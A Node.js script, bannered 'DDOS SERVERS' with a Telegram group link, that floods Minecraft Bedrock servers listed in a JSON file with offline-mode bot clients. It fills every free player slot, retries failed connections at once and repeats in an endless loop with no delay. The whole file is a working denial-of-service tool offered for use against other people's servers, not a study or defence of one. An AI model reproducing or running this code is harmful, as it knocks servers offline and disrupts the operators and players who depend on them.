const { createClient, ping } = require('bedrock-protocol')
const mcs = require('node-mcstatus'); 
const fs = require('fs');
const readline = require('readline');

// Создаем интерфейс для ввода/вывода
const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

async function menu() {
    console.log(`
     ██████╗ ██████╗  █████╗  ██████╗   ██████╗███████╗██████╗ ██╗   ██╗███████╗██████╗  ██████╗
     ██╔══██╗██╔══██╗██╔══██╗██╔════╝  ██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝
     ██║  ██║██║  ██║██║  ██║╚█████╗   ╚█████╗ █████╗  ██████╔╝╚██╗ ██╔╝█████╗  ██████╔╝╚█████╗ 
     ██║  ██║██║  ██║██║  ██║ ╚═══██╗   ╚═══██╗██╔══╝  ██╔══██╗ ╚████╔╝ ██╔══╝  ██╔══██╗ ╚═══██╗
     ██████╔╝██████╔╝╚█████╔╝██████╔╝  ██████╔╝███████╗██║  ██║  ╚██╔╝  ███████╗██║  ██║██████╔╝
     ╚═════╝ ╚═════╝  ╚════╝ ╚═════╝   ╚═════╝ ╚══════╝╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═════╝
     thc: t.me/darkteamLL

Select an action:
1. Make an attack on the server from the list of the json file
2. Exit
`)
    const choice = await new Promise(resolve => rl.question('Ваш выбор: ', resolve));
    switch (choice) {
        case '1':
            (async () => {
                while (true) {
                    for (const server of servers) {
                        await createBotsForServer(server);
                    }
                    await new Promise(resolve => setTimeout(resolve, 0)); // Задержка перед следующей итерацией
                }
            })();
            break;
        case '2':
            rl.close();
            break;
        default:
            console.log("The wrong menu item is selected.");
            break;
    }
}
// Чтение серверов из JSON-файла
const servers = JSON.parse(fs.readFileSync('servers.json', 'utf8'));
// Функция для создания и подключения бота с логикой повторных попыток
async function createBot(username, host, port, version, ip_address) {
    const client = createClient({
        host: host,
        port: port,
        username: username,
        offline: true,
        version: version,
    });

    let connected = false;

    client.on('join', (packet) => {
        connected = true;
        console.log(`[${Date.now()}] ${username} successfully connected to ${ip_address}`);
    });

    client.on('error', (err) => {
        console.error(`${username} - Ошибка:`, err);
        if (!connected) {
            console.error(`Failed to connect ${username}, retry...`);
            setTimeout(() => createBot(username, host, port, version, ip_address), 0);
        }
    });

    client.on('disconnect', (packet) => {
        console.log(`${username} disconnected from the server: ${packet.reason}`);
        if (!connected) {
            setTimeout(() => createBot(username, host, port, version, ip_address), 0);
        }
    });
}

// Функция для создания ботов на одном сервере
async function createBotsForServer(server) {
    const { host, port, version } = server;
    try {
        const result = await mcs.statusBedrock(host, port);
        const maxPlayers = result.players.max;
        const onlinePlayers = result.players.online;
        const choice = await new Promise(resolve => rl.question('Select the maximum number of bots: ', resolve));
        if (onlinePlayers === -1 || maxPlayers === -1) {
            console.error(`Не удалось получить статус сервера ${host}:${port}`);
            return;
        }
        //console.log(`Сервер ${host}:${port} - Максимум игроков: ${maxPlayers}, Онлайн: ${onlinePlayers}`);
        const numBots = Math.min(choice , maxPlayers - onlinePlayers); // Ограничение до 10 ботов
        for (let i = 0; i < numBots; i++) {
            const username = `${Date.now() * i + 1 * maxPlayers * onlinePlayers}`; // Уникальные имена ботов
            createBot(username, host, port, version, result.ip_address);
            await new Promise(resolve => setTimeout(resolve, 0)); // Небольшая задержка
        }
    } catch (error) {
        console.error(`It was not possible to connect bots to the server ${host}:${port}: ${error.message}`);
    }
}
